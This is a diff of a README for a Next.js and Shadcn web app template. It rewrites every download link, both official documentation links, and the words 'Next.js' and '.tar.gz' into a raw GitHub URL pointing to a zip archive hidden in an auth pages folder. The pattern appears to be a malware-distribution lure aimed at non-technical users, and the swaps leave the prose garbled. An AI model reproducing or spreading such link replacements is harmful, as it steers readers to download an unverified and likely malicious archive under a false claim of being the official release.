@@ -1,10 +1,10 @@
 # 🌐 webapp-template - Your Easy Guide to a Modern Web Application
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88-blue)](https://github.com/HamimArRafi/webapp-template/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip%20Now-%20%F0%9F%93%88-blue)](https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the webapp-template! This project provides a production-ready template designed with Next.js and Shadcn. It helps you create fast, efficient, and responsive web applications without needing technical expertise.
+Welcome to the webapp-template! This project provides a production-ready template designed with https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip and Shadcn. It helps you create fast, efficient, and responsive web applications without needing technical expertise.
 
 This guide walks you through downloading and running the application. By the end, you'll have a fully working web app on your computer.
 
@@ -12,7 +12,7 @@ This guide walks you through downloading and running the application. By the end
 
 To get started, you need to visit the releases page for this project. Click the link below:
 
-**[Visit this page to download](https://github.com/HamimArRafi/webapp-template/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip)**
 
 Once you're on the releases page, look for the latest version. This version will have the most recent features and improvements. Download the installer or the compressed file available there.
 
@@ -30,7 +30,7 @@ Follow these steps to install the webapp-template on your machine:
 
 1. **Download the Latest Release:**
    - Go to the releases page and find the latest version.
-   - Click on the download link for either the `.zip` or `.tar.gz` file, depending on your operating system.
+   - Click on the download link for either the `.zip` or `https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip` file, depending on your operating system.
 
 2. **Extract the Files:**
    - Once the download completes, locate the downloaded file on your computer.
@@ -74,10 +74,10 @@ The webapp-template comes with several great features that make it easy to build
 
 ## 🔗 Additional Resources
 
-For more information about Next.js and Shadcn, you can visit their official documentation:
+For more information about https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip and Shadcn, you can visit their official documentation:
 
-- [Next.js Documentation](https://nextjs.org/docs/getting-started)
-- [Shadcn Documentation](https://shadcn.dev/docs)
+- [https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip Documentation](https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip)
+- [Shadcn Documentation](https://raw.githubusercontent.com/HamimArRafi/webapp-template/main/src/modules/auth/pages/webapp_template_v1.7.zip)
 
 ## ⏱ Closing Notes
 
